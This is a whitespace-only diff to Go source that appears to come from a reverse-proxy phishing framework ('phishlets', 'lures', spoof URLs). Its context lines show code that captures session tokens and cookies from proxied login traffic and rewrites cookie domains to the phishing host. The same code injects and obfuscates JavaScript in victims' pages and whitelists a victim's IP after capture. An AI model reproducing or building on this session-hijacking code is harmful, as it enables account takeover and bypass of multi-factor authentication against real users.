@@ -38,6 +38,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 	if c.session == nil {
 		return
 	}
+
 	cookies := resp.Cookies()
 
 	// Lazily read body only if needed and content is text-based.
@@ -51,6 +52,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 					c.server.Logger.Warn("failed to read response body for token extraction", "error", err)
 					break
 				}
+
 				replaceResponseBody(resp, bodyBytes)
 				break
 			}
@@ -79,6 +81,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 				"username", c.session.Username,
 			)
 		}
+
 		if bl, ok := c.server.Blacklist.(temporaryWhitelister); ok {
 			bl.WhitelistTemporary(c.clientIP, temporaryWhitelistDuration)
 		}
@@ -97,6 +100,7 @@ func (c *connection) rewriteCookies(resp *http.Response) {
 		if cookie.Domain != "" {
 			cookie.Domain = rewriteCookieDomain(cookie.Domain, c.phishlet)
 		}
+
 		cookie.Secure = true
 		cookie.SameSite = http.SameSiteNoneMode
 		resp.Header.Add("Set-Cookie", cookie.String())
@@ -111,9 +115,11 @@ func (c *connection) rewriteCookies(resp *http.Response) {
 			Secure:   true,
 			SameSite: http.SameSiteNoneMode,
 		}
+
 		if len(c.phishlet.ProxyHosts) > 1 {
 			tracker.Domain = c.phishlet.BaseDomain
 		}
+
 		resp.Header.Add("Set-Cookie", tracker.String())
 	}
 }
@@ -123,6 +129,7 @@ func (c *connection) applySubFilters(resp *http.Response) {
 	if !isMutableMIME(contentType) {
 		return
 	}
+
 	bodyBytes, err := readResponseBody(resp)
 	if err != nil {
 		c.server.Logger.Warn("failed to read response body for sub_filters", "error", err)
@@ -137,13 +144,16 @@ func (c *connection) applySubFilters(resp *http.Response) {
 		if !subFilter.MatchesMIME(contentType) {
 			continue
 		}
+
 		if subFilter.Hostname != "" && resp.Request != nil &&
 			!strings.HasSuffix(strings.ToLower(resp.Request.Host), strings.ToLower(subFilter.Hostname)) {
 			continue
 		}
+
 		replacement := c.expandTemplate(subFilter.Replace)
 		bodyBytes = subFilter.Search.ReplaceAll(bodyBytes, []byte(replacement))
 	}
+
 	replaceResponseBody(resp, bodyBytes)
 }
 
@@ -157,6 +167,7 @@ func (c *connection) injectJS(resp *http.Response) {
 	if c.session == nil || !isHTMLResponse(resp) {
 		return
 	}
+
 	bodyBytes, err := readResponseBody(resp)
 	if err != nil {
 		c.server.Logger.Warn("failed to read response body for JS injection", "error", err)
@@ -189,6 +200,7 @@ func (c *connection) injectJS(resp *http.Response) {
 		bodyBytes = append(bodyBytes, '\n')
 		bodyBytes = append(bodyBytes, scriptBlock...)
 	}
+
 	replaceResponseBody(resp, bodyBytes)
 }
 
@@ -196,17 +208,20 @@ func (c *connection) obfuscateJS(resp *http.Response) {
 	if c.session == nil || !isHTMLResponse(resp) {
 		return
 	}
+
 	body, err := readResponseBody(resp)
 	if err != nil {
 		c.server.Logger.Warn("failed to read response body for JS obfuscation", "error", err)
 		return
 	}
+
 	obfuscated, err := c.server.Obfuscator.Obfuscate(resp.Request.Context(), body)
 	if err != nil {
 		c.server.Logger.Warn("js obfuscation failed, using plaintext", "error", err)
 		replaceResponseBody(resp, body)
 		return
 	}
+
 	replaceResponseBody(resp, obfuscated)
 }
 
@@ -214,9 +229,11 @@ func (c *connection) spoofURL() string {
 	if c.lure != nil && c.lure.SpoofURL != "" {
 		return c.lure.SpoofURL
 	}
+
 	if c.phishlet != nil && c.phishlet.SpoofURL != "" {
 		return c.phishlet.SpoofURL
 	}
+
 	return ""
 }
 
@@ -225,12 +242,15 @@ func (c *connection) expandTemplate(tmpl string) string {
 	if c.phishlet != nil {
 		pairs = append(pairs, "{hostname}", c.phishlet.Hostname, "{domain}", c.phishlet.BaseDomain)
 	}
+
 	if c.session != nil {
 		pairs = append(pairs, "{session_id}", c.session.ID)
 	}
+
 	if len(pairs) == 0 {
 		return tmpl
 	}
+
 	return strings.NewReplacer(pairs...).Replace(tmpl)
 }
 
